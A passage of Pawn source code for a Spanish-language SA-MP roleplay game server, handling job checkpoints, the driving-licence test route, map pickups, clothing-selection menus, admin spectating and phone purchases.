		if(IsAPlane(vehicleid) || IsAHelicopter(vehicleid))
		{
	  		if(PlayerInfo[playerid][pFlyLic] == 0)
			  {
				if(AdminDuty[playerid] == 0)
				{
				    SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes licencia de vuelo!");
	   				RemovePlayerFromVehicle(playerid);
				}
			}
	   	}
	}

	foreach(Player, x)
	{
		if(PlayerInfo[x][pSpectating] != INVALID_PLAYER_ID && PlayerInfo[x][pSpectating] == playerid)
		{
			if(newstate == 2 && oldstate == 1 || newstate == 3 && oldstate == 1)
				PlayerSpectateVehicle(x, GetPlayerVehicleID(playerid));
			else
				PlayerSpectatePlayer(x, playerid);
		}
	}
	return 1;
}

public garbageTimer(playerid, garbcp)
{
    TogglePlayerControllable(playerid, true);
    if(garbcp == 25)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Vuelve y vac�a el cami�n en el dep�sito.");
  	}
  	else if(garbcp == 26)
	{
  	    new paycheck = JOB_GARB_MONEY;
  	    RemovePlayerFromVehicle(playerid);
	    PlayerInfo[playerid][pCantWork] = 1;
	    PlayerInfo[playerid][pPayCheck] += paycheck;
	    jobBreak[playerid] = 80;
	    jobDuty[playerid] = false;
	    SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	    SetEngine(GetPlayerVehicleID(playerid), 0);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		PlayerActionMessage(playerid, 15.0, "abre las puertas del dep�sito y vac�a el cami�n recolector.");
		SendFMessage(playerid, COLOR_WHITE, "�Enhorabuena! has finalizado tu trabajo, recibir�s $%d en el pr�ximo payday.", paycheck);
		DeletePVar(playerid, "garbageRoute");
  	    DeletePVar(playerid, "garbageCheckpoint");
  	}
	return 1;
}

stock hasFireGun(playerid) {
	new wep = GetPlayerWeapon(playerid);
	if(wep >= 22 && wep <= 34) return 1; else return 0;
}


public OnPlayerEnterCheckpoint(playerid) {
	PlayerPlaySound(playerid, 1139, 0.0, 0.0, 0.0);
	DisablePlayerCheckpoint(playerid);
	
    if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999) {
	    TaxiAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Has llegado al destino", 5000, 1);
		TaxiCallTime[playerid] = 0;
	}

	new
		string[128],
		faction = PlayerInfo[playerid][pFaction],
		vehicleID = GetPlayerVehicleID(playerid),
		Float:vehicleHP;

    GetVehicleHealth(vehicleID, vehicleHP);
    
	if(MechanicCallTime[playerid] > 0 && faction == FAC_MECH)
	    MechanicCallTime[playerid] = 0;

	if(CheckMissionEvent(playerid, 4)) {}
		else CheckMissionEvent(playerid, 5);
	
    if(PlayerInfo[playerid][pJob] == JOB_FARM && jobDuty[playerid] && VehicleInfo[vehicleID][VehJob] == JOB_FARM) {
    	if(CollectedProds[playerid] < JOB_FARM_MAXPRODS) {
    	   	new rCP = -1;
			while(rCP == -1 || rCP == LastCP[playerid]) {
	 			rCP = random(sizeof(JOB_FARM_POS) - 2);
    		}
	 		LastCP[playerid] = rCP;
            CollectedProds[playerid]++;
            format(string, sizeof(string), "Producto: %d/%d", CollectedProds[playerid], JOB_FARM_MAXPRODS);
			GameTextForPlayer(playerid, string, 1400, 1);
			if(CollectedProds[playerid] == JOB_FARM_MAXPRODS) {
			 	SetPlayerCheckpoint(playerid, JOB_FARM_POS[sizeof(JOB_FARM_POS) - 1][0], JOB_FARM_POS[sizeof(JOB_FARM_POS) - 1][1], JOB_FARM_POS[sizeof(JOB_FARM_POS) - 1][2], 5.4);
				SendClientMessage(playerid, COLOR_WHITE, "�Has terminado con tu trabajo!, ahora v� y descarga el material (/terminar).");
			} else {
			    SetPlayerCheckpoint(playerid, JOB_FARM_POS[rCP][0], JOB_FARM_POS[rCP][1], JOB_FARM_POS[rCP][2], 5.4);
			}
        }
    } else if(PlayerInfo[playerid][pJob] == JOB_DRUGF && jobDuty[playerid] && VehicleInfo[vehicleID][VehJob] == JOB_DRUGF) {
    	if(CollectedProds[playerid] < JOB_DRUGF_MAXPRODS) {
    	   	new rCP = -1;
    
			while(rCP == -1 || rCP == LastCP[playerid] || GetDistance(JOB_DRUGF_POS[rCP][0], JOB_DRUGF_POS[rCP][1], JOB_DRUGF_POS[rCP][2], JOB_DRUGF_POS[LastCP[playerid]][0], JOB_DRUGF_POS[LastCP[playerid]][1], JOB_DRUGF_POS[LastCP[playerid]][2]) < 30) {
	 			rCP = random(sizeof(JOB_DRUGF_POS) - 2);
    		}
    		
	 		LastCP[playerid] = rCP;
            CollectedProds[playerid]++;
            format(string, sizeof(string), "Producto: %d/%d", CollectedProds[playerid], JOB_DRUGF_MAXPRODS);
			GameTextForPlayer(playerid, string, 1400, 1);
			if(CollectedProds[playerid] == JOB_DRUGF_MAXPRODS) {
			 	SetPlayerCheckpoint(playerid, JOB_DRUGF_POS[sizeof(JOB_DRUGF_POS) - 1][0], JOB_DRUGF_POS[sizeof(JOB_DRUGF_POS) - 1][1], JOB_DRUGF_POS[sizeof(JOB_DRUGF_POS) - 1][2], 5.4);
				SendClientMessage(playerid, COLOR_WHITE, "�Has terminado con tu trabajo!, ahora v� y descarga el material (/terminar).");
            	LastCP[playerid] = sizeof(JOB_DRUGF_POS) - 1;
			} else {
			    SetPlayerCheckpoint(playerid, JOB_DRUGF_POS[rCP][0], JOB_DRUGF_POS[rCP][1], JOB_DRUGF_POS[rCP][2], 5.4);
			}
        }
    } else if(PlayerInfo[playerid][pJob] == JOB_TRAN && jobDuty[playerid] && VehicleInfo[vehicleID][VehJob] == JOB_TRAN) {
    	if(CollectedProds[playerid] < JOB_TRAN_MAXPRODS) {
    	    if(carryingProd[playerid]) {
    	        carryingProd[playerid] = false;
	            CollectedProds[playerid]++;
	            format(string, sizeof(string), "Paquetes entregados: %d/%d", CollectedProds[playerid], JOB_TRAN_MAXPRODS);
				GameTextForPlayer(playerid, string, 1400, 1);
				SetPlayerCheckpoint(playerid, JOB_TRAN_POS[16][0], JOB_TRAN_POS[16][1], JOB_TRAN_POS[16][2], 5.4);
				if(CollectedProds[playerid] == JOB_TRAN_MAXPRODS) {
					SendClientMessage(playerid, COLOR_WHITE, "�Has terminado con tu trabajo!, vuelve a la agencia.");
				}
    	    } else {
    	        if(CollectedProds[playerid] == JOB_TRAN_MAXPRODS) {
					SendClientMessage(playerid, COLOR_WHITE, "Tipea /terminar para confirmar los env�os.");
    	            return 1;
    	        }
                carryingProd[playerid] = true;
    	       	new rCP = -1;
				while(rCP == 16 || rCP == -1 || rCP == LastCP[playerid]) {
		 			rCP = random(sizeof(JOB_TRAN_POS));
		 		}
		 		LastCP[playerid] = rCP;
                SetPlayerCheckpoint(playerid, JOB_TRAN_POS[rCP][0], JOB_TRAN_POS[rCP][1], JOB_TRAN_POS[rCP][2], 5.4);
    	    }
        }
    } else if(PlayerInfo[playerid][pJob] == JOB_GARB && jobDuty[playerid] && VehicleInfo[vehicleID][VehType] == VEH_JOB && VehicleInfo[vehicleID][VehJob] == JOB_GARB) {
        new
			gbCP = GetPVarInt(playerid, "garbageCheckpoint"),
			route = GetPVarInt(playerid, "garbageRoute");
			
        if(gbCP == 26) {
			SendClientMessage(playerid, COLOR_WHITE, "Vaciando cami�n...");
			TogglePlayerControllable(playerid, false);
			SetPVarInt(playerid, "garbT", SetTimerEx("garbageTimer", 6000, false, "ii", playerid, gbCP));
        } else {
            TogglePlayerControllable(playerid, false);
            SetPVarInt(playerid, "garbT", SetTimerEx("garbageTimer", 2000, false, "ii", playerid, gbCP));
            GameTextForPlayer(playerid, "Cargando basura...", 2000, 4);
			SetPVarInt(playerid, "garbageCheckpoint", gbCP + 1);
			if(route == 0) {
 	 			SetPlayerCheckpoint(playerid, JOB_GARB_POS_R0[gbCP][0], JOB_GARB_POS_R0[gbCP][1], JOB_GARB_POS_R0[gbCP][2], 5.4);
			} else if(route == 1) {
			    SetPlayerCheckpoint(playerid, JOB_GARB_POS_R1[gbCP][0], JOB_GARB_POS_R1[gbCP][1], JOB_GARB_POS_R1[gbCP][2], 5.4);
			}
        }
    } else if(playerLicense[playerid][lDStep] >= 1 && VehicleInfo[vehicleID][VehType] == VEH_SCHOOL) {

		if(PlayerToPoint(5.0, playerid, 1109.8116, -1743.4208, 13.1255) && playerLicense[playerid][lDStep] == 1) {
            playerLicense[playerid][lDStep] = 2;
            SetPlayerCheckpoint(playerid, 1173.1102, -1797.7059, 13.1255, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 1173.1102, -1797.7059, 13.1255) && playerLicense[playerid][lDStep] == 2) {
            playerLicense[playerid][lDStep] = 3;
            SetPlayerCheckpoint(playerid, 1057.7532, -1828.5193, 13.3029, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 1057.7532, -1828.5193, 13.3029) && playerLicense[playerid][lDStep] == 3) {
            playerLicense[playerid][lDStep] = 4;
            SetPlayerCheckpoint(playerid, 919.7889, -1757.2719, 13.1067, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 919.7889, -1757.2719, 13.1067) && playerLicense[playerid][lDStep] == 4) {
            playerLicense[playerid][lDStep] = 5;
            SetPlayerCheckpoint(playerid, 902.1602, -1569.7883, 13.1176, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 902.1602, -1569.7883, 13.1176) && playerLicense[playerid][lDStep] == 5)	{
            playerLicense[playerid][lDStep] = 6;
            SetPlayerCheckpoint(playerid, 829.7626, -1603.0767, 13.1099, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 829.7626, -1603.0767, 13.1099) && playerLicense[playerid][lDStep] == 6) {
            playerLicense[playerid][lDStep] = 7;
            SetPlayerCheckpoint(playerid, 647.6819, -1584.2423, 15.2000, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 647.6819, -1584.2423, 15.2000) && playerLicense[playerid][lDStep] == 7) {
            playerLicense[playerid][lDStep] = 8;
            SetPlayerCheckpoint(playerid, 653.3600, -1408.1958, 13.1295, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 653.3600, -1408.1958, 13.1295) && playerLicense[playerid][lDStep] == 8) {
            playerLicense[playerid][lDStep] = 9;
            SetPlayerCheckpoint(playerid, 793.8990, -1458.8011, 13.1097, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 793.8990, -1458.8011, 13.1097) && playerLicense[playerid][lDStep] == 9) {
            playerLicense[playerid][lDStep] = 10;
            SetPlayerCheckpoint(playerid, 788.2633, -1589.3638, 13.1156, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 788.2633, -1589.3638, 13.1156) && playerLicense[playerid][lDStep] == 10) {
            playerLicense[playerid][lDStep] = 11;
            SetPlayerCheckpoint(playerid, 869.7507, -1585.5740, 13.1099, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 869.7507, -1585.5740, 13.1099) && playerLicense[playerid][lDStep] == 11) {
            playerLicense[playerid][lDStep] = 12;
            SetPlayerCheckpoint(playerid, 1022.3455, -1574.2153, 13.1099, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 1022.3455, -1574.2153, 13.1099) && playerLicense[playerid][lDStep] == 12){
            playerLicense[playerid][lDStep] = 13;
            SetPlayerCheckpoint(playerid, 1035.0615, -1710.3101, 13.1161, 5.0);
	 	} else if(PlayerToPoint(5.0, playerid, 1035.0615, -1710.3101, 13.1161) && playerLicense[playerid][lDStep] == 13){
            playerLicense[playerid][lDStep] = 14;
            SetPlayerCheckpoint(playerid, 1172.8400, -1725.2491, 13.3243, 5.0);
		} else if(PlayerToPoint(5.0, playerid, 1172.8400, -1725.2491, 13.3243) && playerLicense[playerid][lDStep] == 14) {
            playerLicense[playerid][lDStep] = 15;
            SetPlayerCheckpoint(playerid,1110.3588, -1738.2627, 13.2299 , 5.0);
		} else if(PlayerToPoint(5.0, playerid, 1110.3588, -1738.2627, 13.2299) && playerLicense[playerid][lDStep] == 15) {
			KillTimer(timersID[10]);
			PlayerTextDrawHide(playerid, PTD_Timer[playerid]);

		    if(vehicleHP < 1000.0) {
				SendClientMessage(playerid, COLOR_LIGHTRED, "�Has fallado la prueba!, el veh�culo se encuentra da�ado.");
		    } else if(playerLicense[playerid][lDMaxSpeed] >= 76) {
		    	SendFMessage(playerid, COLOR_LIGHTRED, "�Has fallado la prueba!, has conducido muy r�pido (velocidad m�xima: %f KM/H).", playerLicense[playerid][lDMaxSpeed]);
			} else {
		        SendFMessage(playerid, COLOR_LIGHTGREEN, "�Has superado la prueba!, ahora tienes una licencia de conducir (velocidad m�xima: %f KM/H).", playerLicense[playerid][lDMaxSpeed]);
		    	PlayerInfo[playerid][pCarLic] = 1;
	    	 	GivePlayerCash(playerid, -PRICE_LIC_DRIVING);
		    }
		    SetVehicleToRespawn(vehicleID);
		    PutPlayerInVehicle(playerid, vehicleID, 0);
			RemovePlayerFromVehicle(playerid);
		    playerLicense[playerid][lDTaking] = 0;
            playerLicense[playerid][lDStep] = 0;
            playerLicense[playerid][lDTime] = 0;
            playerLicense[playerid][lDMaxSpeed] = 0;
		}
	}
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid) {
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
    DisablePlayerRaceCheckpoint(playerid);
    OnDriverRaceCheckpoint(playerid);
	deleteFinishedSprintRace(playerid);
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerClickTextDraw(playerid, Text:clickedid) {
   	if(GetPVarInt(playerid, "skinc_active") == 0) return 0;
	if(clickedid == Text:INVALID_TEXT_DRAW) {
        DestroySelectionMenu(playerid);
        SetPVarInt(playerid, "skinc_active", 0);
        PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
        return 1;
	}
	return 0;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid) {
	new skintype;
	if(GetPVarInt(playerid, "skinc_active") == 0) return 0;

	new curpage = GetPVarInt(playerid, "skinc_page");

	if(Business[GetPlayerBusiness(playerid)][bType] == BIZ_CLOT) {
		if(PlayerInfo[playerid][pSex] == 1) {
		    skintype = 1;
		} else {
			skintype = 3;
		}
	} else if(Business[GetPlayerBusiness(playerid)][bType] == BIZ_CLOT2) {
		if(PlayerInfo[playerid][pSex] == 1) {
		    skintype = 2;
		} else {
			skintype = 4;
		}
	}
	
	if(playertextid == gNextButtonTextDrawId[playerid]) {
	    if(curpage < (GetNumberOfPages(skintype) - 1)) {
	        SetPVarInt(playerid, "skinc_page", curpage + 1);
	        ShowPlayerModelPreviews(playerid, skintype);
         	UpdatePageTextDraw(playerid, skintype);
         	PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
		} else {
		    PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		}
		return 1;
	}

	if(playertextid == gPrevButtonTextDrawId[playerid]) {
	    if(curpage > 0) {
	    	SetPVarInt(playerid, "skinc_page", curpage - 1);
	    	ShowPlayerModelPreviews(playerid, skintype);
	    	UpdatePageTextDraw(playerid, skintype);
	    	PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
		} else {
		    PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		}
		return 1;
	}

	new x=0;
	while(x != SELECTION_ITEMS) {
	    if(playertextid == gSelectionItems[playerid][x]) {
	        HandlePlayerItemSelection(playerid, x, skintype);
	        PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
	        DestroySelectionMenu(playerid);
	        CancelSelectTextDraw(playerid);
        	SetPVarInt(playerid, "skinc_active", 0);
        	return 1;
		}
		x++;
	}
	return 0;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
	    if(!IsPlayerConnected(clickedplayerid))
	    	return SendClientMessage(playerid, COLOR_GREY, "{FF4600}[Error]:{C8C8C8} el jugador no se ha conectado.");
		
		if(PlayerInfo[playerid][pSpectating] == INVALID_PLAYER_ID)
		{
			GetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
			PlayerInfo[playerid][pInterior] = GetPlayerInterior(playerid);
			PlayerInfo[playerid][pVirtualWorld] = GetPlayerVirtualWorld(playerid);
			PlayerInfo[playerid][pSkin] = GetPlayerSkin(playerid);

			if(AdminDuty[playerid] == 0)
			{
			    new Float:hp;
				GetPlayerHealthEx(playerid, hp);
				SetPVarFloat(playerid, "tempHealth", hp);
				GetPlayerArmour(playerid, PlayerInfo[playerid][pArmour]);
			}
	    }
	    PlayerInfo[playerid][pSpectating] = clickedplayerid;
	    TogglePlayerSpectating(playerid, true);

		SetPlayerInterior(playerid, GetPlayerInterior(clickedplayerid));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(clickedplayerid));

	    if(IsPlayerInAnyVehicle(clickedplayerid))
	        PlayerSpectateVehicle(playerid, GetPlayerVehicleID(clickedplayerid));
	    else
			PlayerSpectatePlayer(playerid, clickedplayerid);

		TextDrawShowForPlayer(playerid, textdrawVariables[0]);
	}
	return 1;
}

stock LoadPickups() {

	/* C�maras de Seguridad PMA */
	P_POLICE_CAMERAS = CreateDynamicPickup(1239, 1, 219.36, 188.31, 1003.00, -1);
	CreateDynamic3DTextLabel("C�maras de Seguridad de la Ciudad", COLOR_WHITE, 219.36, 188.31, 1003.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 16002, 3, -1, 100.0);

	/* Gimnasio */
	P_FIGHT_STYLE = CreateDynamicPickup(1239, 1, 766.3723, 13.8237, 1000.7015, -1);

	// Param�dicos.
	P_HOSP_DUTY = CreateDynamicPickup(1239, 1, POS_MEDIC_DUTY_X, POS_MEDIC_DUTY_Y, POS_MEDIC_DUTY_Z, -1);

	// Curarse en hospital
	P_HOSP_HEAL = CreateDynamicPickup(1240, 1, POS_HOSP_HEAL_X, POS_HOSP_HEAL_Y, POS_HOSP_HEAL_Z + 1.0, -1);

	// Robo de autos
	P_CAR_DEMOLITION = CreateDynamicPickup(1239, 1, POS_CAR_DEMOLITION_X, POS_CAR_DEMOLITION_Y, POS_CAR_DEMOLITION_Z, -1);

	// Departamentos Bracone y Mercier
	CreateDynamicPickup(1239, 1, 1467.4867, -1356.0726, 50.5117, -1);
	CreateDynamic3DTextLabel("/ascensor para llamar al ascensor \n/piso dentro del mismo para usarlo.", COLOR_WHITE, 1467.4867, -1356.0726, 50.5117 + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);

	// Auto reparacion
	for(new i = 0; i < 3; i++)
	{
		CreateDynamicPickup(1239, 1, PayNSprayPos[i][0], PayNSprayPos[i][1], PayNSprayPos[i][2], -1);
		CreateDynamic3DTextLabel("/repararvehiculo (Min $250)\n El costo depende del da�o de tu veh�culo.", COLOR_WHITE, PayNSprayPos[i][0], PayNSprayPos[i][1], PayNSprayPos[i][2] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
	}
	
	/* Banco de Malos Aires */
	P_BANK = CreateDynamicPickup(1239, 1, POS_BANK_X, POS_BANK_Y, POS_BANK_Z, -1);

	/* Armarios de la Polic�a Metropolitana */
	P_POLICE_DUTY = CreateDynamicPickup(1242, 1, POS_POLICE_DUTY_X, POS_POLICE_DUTY_Y, POS_POLICE_DUTY_Z, -1);
	P_POLICE_ARREST = CreateDynamicPickup(1239, 1, POS_POLICE_ARREST_X, POS_POLICE_ARREST_Y, POS_POLICE_ARREST_Z, -1);

	/* Armarios de la S.I.D.E */
	P_SIDE_DUTY = CreateDynamicPickup(1242, 1, POS_SIDE_DUTY_X, POS_SIDE_DUTY_Y, POS_SIDE_DUTY_Z, -1);

	/* Centro de Licencias de Malos Aires */
	P_LICENSE_CENTER = CreateDynamicPickup(1239, 1, -2033.2118, -117.4678, 1035.1719, -1);

    /* Oficina del Empleo de Malos Aires */
    P_JOB_CENTER = CreateDynamicPickup(1210, 1, 361.8299, 173.7898, 1008.3828, -1);

    /* Gu�a de la ciudad */
    for(new i = 0; i < sizeof(P_GUIDE); i++) {
    	P_GUIDE[i] = CreateDynamicPickup(1444, 1, GUIDE_POS[i][0], GUIDE_POS[i][1], GUIDE_POS[i][2], -1);
    }

    /* Cosechador de materia prima */
	P_DRUGFARM_MATS = CreateDynamicPickup(1239, 1, -1060.9709, -1195.5382, 129.6939);

    // Garages de tuneo.
   	P_TUNE[0] = CreateDynamicPickup(1239, 1, -2714.6985, 222.1743, 4.3281, -1);
    P_TUNE[1] = CreateDynamicPickup(1239, 1, 2649.7874, -2037.5381, 13.5500, -1);
    P_TUNE[2] = CreateDynamicPickup(1239, 1, -1931.3779, 237.0436, 34.3470, -1);
    P_TUNE[3] = CreateDynamicPickup(1239, 1, 1044.7301, -1027.6169, 32.1016, -1);
    P_TUNE[4] = CreateDynamicPickup(1239, 1, 2391.1355, 1041.8885, 10.8203, -1);

	// Venta de repuestos
	P_CARPART_SHOP = CreateDynamicPickup(1239, 1, MEC_CARPART_SHOP_X, MEC_CARPART_SHOP_Y, MEC_CARPART_SHOP_Z, -1);

	// Black Markets
	P_BLACK_MARKET[0] = CreateDynamicPickup(1210, 1, POS_BM1_X, POS_BM1_Y, POS_BM1_Z, -1);
	P_BLACK_MARKET[1] = CreateDynamicPickup(1210, 1, POS_BM2_X, POS_BM2_Y, POS_BM2_Z, -1);
	P_BLACK_MARKET[2] = CreateDynamicPickup(1210, 1, POS_BM3_X, POS_BM3_Y, POS_BM3_Z, -1);

	// Renta de autos
	P_CAR_RENT1 = CreateDynamicPickup(1239, 1, 1569.8145, -2243.8796, 13.5184, -1);
	P_CAR_RENT2	= CreateDynamicPickup(1239, 1, 1276.8502, -1309.8553, 13.3107, -1);
	P_CAR_RENT3 = CreateDynamicPickup(1239, 1, 611.9272, -1294.7240, 15.2081, -1);

    P_MATS_SHOP = CreateDynamicPickup(1239, 1, 2349.8408, -1216.3939, 22.5000, -1);
    P_PRODS_SHOP = CreateDynamicPickup(1239, 1, 2183.9963, -2260.7658, 13.4098, -1);
    
    // Compra de insumos
	P_INPUTS_SHOP_N = CreateDynamicPickup(1239, 1, POS_INPUTS_NORTE_X, POS_INPUTS_NORTE_Y, POS_INPUTS_NORTE_Z, -1);
	P_INPUTS_SHOP_S = CreateDynamicPickup(1239, 1, POS_INPUTS_SUR_X, POS_INPUTS_SUR_Y, POS_INPUTS_SUR_Z, -1);

	// Consecionarias
	LoadCarDealerPickups();
	
	return 1;
}

public OnPlayerPickUpDynamicPickup(playerid, pickupid) {

	for(new i = 0; i < 5; i++) {
	    if(pickupid == P_TUNE[i]) {
	        if(PlayerInfo[playerid][pFaction] == FAC_MECH && PlayerInfo[playerid][pRank] <= 3) {
	            GameTextForPlayer(playerid, "~w~Escribe /mectaller para abrir o cerrar el taller", 2000, 4);
	        } else {
	        	GameTextForPlayer(playerid, "~w~Para personalizar tu vehiculo llama al 555", 2000, 4);
	        }
			return 1;
		}
	}
	
	for(new i = 0; i < sizeof(P_GUIDE); i++) {
	    if(pickupid == P_GUIDE[i]) {
	        GameTextForPlayer(playerid, "~w~/guia para ver una lista de lugares disponibles.", 2000, 4);
	        return 1;
	    }
	}
	
	for(new i = 0; i < sizeof(P_BLACK_MARKET); i++) {
	    if(pickupid == P_BLACK_MARKET[i]) {
	        GameTextForPlayer(playerid, "~w~Mercado negro - Utiliza /comprar o /vender.", 2000, 4);
	        return 1;
	    }
	}

	if(pickupid == P_BANK) {
		GameTextForPlayer(playerid, "~w~/ayudabanco", 2000, 4);
		return 1;

	} else if(pickupid == P_FIGHT_STYLE) {
		GameTextForPlayer(playerid, "~w~Escribe /aprender para adquirir nuevos conocimientos de pelea.", 2000, 4);
		return 1;

	} else if(pickupid == P_POLICE_ARREST && PlayerInfo[playerid][pFaction] == FAC_PMA) {
		GameTextForPlayer(playerid, "~w~/arrestar aqui para arrestar.", 2000, 4);
		return 1;

	} else if(pickupid == P_POLICE_DUTY && PlayerInfo[playerid][pFaction] == FAC_PMA) {
		GameTextForPlayer(playerid, "~w~/pservicio - /pequipo - /propero - /pchaleco", 2000, 4);
		return 1;

	} else if(pickupid == P_HOSP_DUTY && PlayerInfo[playerid][pFaction] == FAC_HOSP) {
		GameTextForPlayer(playerid, "~w~/mservicio - /mequipo", 2000, 4);
		return 1;

	} else if(pickupid == P_SIDE_DUTY && PlayerInfo[playerid][pFaction] == FAC_SIDE) {
		GameTextForPlayer(playerid, "~w~/sservicio - /sequipo - /sropero - /schaleco", 2000, 4);
		return 1;

	} else if(pickupid == P_LICENSE_CENTER) {
		GameTextForPlayer(playerid, "~w~/licencias para ver las licencias disponibles. ~n~/manuales para ver los manuales.", 2000, 4);
		return 1;

	} else if(pickupid == P_JOB_CENTER) {
		GameTextForPlayer(playerid, "~w~/empleos para ver una lista de los empleos disponibles.", 2000, 4);
		return 1;

	} else if(pickupid == P_POLICE_CAMERAS) {
		GameTextForPlayer(playerid, "~w~/camaras para seleccionar una camara de la ciudad.", 2000, 4);
		return 1;

	} else if(pickupid == P_HOSP_HEAL) {
		new string[128];
		format(string, sizeof(string), "~w~/curarse para solicitar un medico que atienda tus heridas ($%d)", PRICE_HOSP_HEAL);
		GameTextForPlayer(playerid, string, 2000, 4);
		return 1;

	} else if(pickupid == P_CAR_DEMOLITION) {
		if(PlayerInfo[playerid][pJob] == JOB_FELON && ThiefJobInfo[playerid][pFelonLevel] >= 7)
			GameTextForPlayer(playerid, "~w~Utiliza /desarmar para desarmar el vehiculo robado.", 2000, 4);
		return 1;

	} else if(pickupid == P_CARPART_SHOP) {
		if(PlayerInfo[playerid][pFaction] == FAC_MECH)
			GameTextForPlayer(playerid, "~w~Utiliza /meccomprar para comprar repuestos de auto.", 2000, 4);
		return 1;

	} else if(pickupid == P_CAR_RENT1 || pickupid == P_CAR_RENT2 || pickupid == P_CAR_RENT3) {
		GameTextForPlayer(playerid, "~w~Alquiler de vehiculos", 2000, 4);
		return 1;

	} else if(pickupid == P_MATS_SHOP) {
		if(PlayerInfo[playerid][pFaction] != FAC_NONE && FactionInfo[PlayerInfo[playerid][pFaction]][fType] == FAC_TYPE_ILLEGAL) {
 			new string[128];
			format(string, sizeof(string), "~w~/comprarmateriales para comprar piezas - $%d por unidad", GetItemPrice(ITEM_ID_MATERIALES));
		    GameTextForPlayer(playerid, string, 2000, 4);
		}

	} else if(pickupid == P_DRUGFARM_MATS) {
	    if(PlayerInfo[playerid][pJob] == JOB_DRUGD) {
	    	new string[128];
			format(string, sizeof(string), "~w~bolsas de materia prima: %d a $%d c/u", ServerInfo[sDrugRawMats], GetItemPrice(ITEM_ID_MATERIAPRIMA));
		    GameTextForPlayer(playerid, string, 2000, 4);
	    } else if(PlayerInfo[playerid][pJob] == JOB_DRUGF) {
	    	new string[128];
			format(string, sizeof(string), "~w~bolsas de materia prima: %d", ServerInfo[sDrugRawMats]);
		    GameTextForPlayer(playerid, string, 2000, 4);
 	    }

	} else if(pickupid == P_PRODS_SHOP) {
		new string[128];
		format(string, sizeof(string), "~w~/comprarproductos para comprar productos - $%d por unidad", GetItemPrice(ITEM_ID_PRODUCTOS));
		GameTextForPlayer(playerid, string, 2000, 4);
	} else if(pickupid == P_INPUTS_SHOP_N || pickupid == P_INPUTS_SHOP_S) {
		if(PlayerInfo[playerid][pFaction] == FAC_PMA || PlayerInfo[playerid][pFaction] == FAC_SIDE) {
			new string[128];
			format(string, sizeof(string), "~w~/comprarinsumos para comprar insumos - $%d por unidad", GetItemPrice(ITEM_ID_MATERIALES));
			GameTextForPlayer(playerid, string, 2000, 4);
		}
	}
	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row) {
    new
        business = GetPlayerBusiness(playerid),
		Menu:currentMenu = GetPlayerMenu(playerid);

 	if(currentMenu == phoneMenu) {
	    switch(row) {
	        case 0: {
	            new
	                phoneNumber = 40000 + random(999999); // Min: 40000, Max: 999999

				if(Business[business][bProducts] <= 0 && Business[business][bOwnerSQLID] != -1) {
		            SendClientMessage(playerid, COLOR_YELLOW2, "Parece que no disponen de stock, intenta volviendo m�s tarde.");
		        } else if(GetPlayerCash(playerid) >= PRICE_PHONE) {
					SendFMessage(playerid, COLOR_YELLOW2, "�Felicidades! has comprado un tel�fono celular ($%d) utiliza /ayuda para ver los comandos disponibles.", PRICE_PHONE);
					GivePlayerCash(playerid, -PRICE_PHONE);
					PlayerActionMessage(playerid, 15.0, "toma dinero de su bolsillo, le paga al empleado y recibe un tel�fono a cambio.");
					PlayerInfo[playerid][pPhoneNumber] = phoneNumber;
					PlayerInfo[playerid][pPhoneC] = business;
					PlayerInfo[playerid][pListNumber] = 1;
					if(Business[business][bOwnerSQLID] != -1) {
					   	Business[business][bTill] += PRICE_PHONE / 2;
	        			Business[business][bProducts]--;
	        			saveBusiness(business);
					}
				} else {
				    SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el dinero suficiente!");
				}
			}
			case 1: {
	            new
	                phoneNumber = 40000 + random(999999); // Min: 40000, Max: 999999

				if(Business[business][bProducts] <= 0 && Business[business][bOwnerSQLID] != -1) {
		            SendClientMessage(playerid, COLOR_YELLOW2, "Parece que no disponen de stock, intenta volviendo m�s tarde.");
		        } else if(GetPlayerCash(playerid) >= PRICE_UNLISTEDPHONE) {
					SendFMessage(playerid, COLOR_YELLOW2, "�Felicidades! has comprado un tel�fono celular no listado en la gu�a ($%d) utiliza  /ayuda para ver los comandos disponibles.", PRICE_UNLISTEDPHONE);
					GivePlayerCash(playerid, -PRICE_UNLISTEDPHONE);
					PlayerActionMessage(playerid, 15.0, "toma dinero de su bolsillo, le paga al empleado y recibe un tel�fono a cambio.");
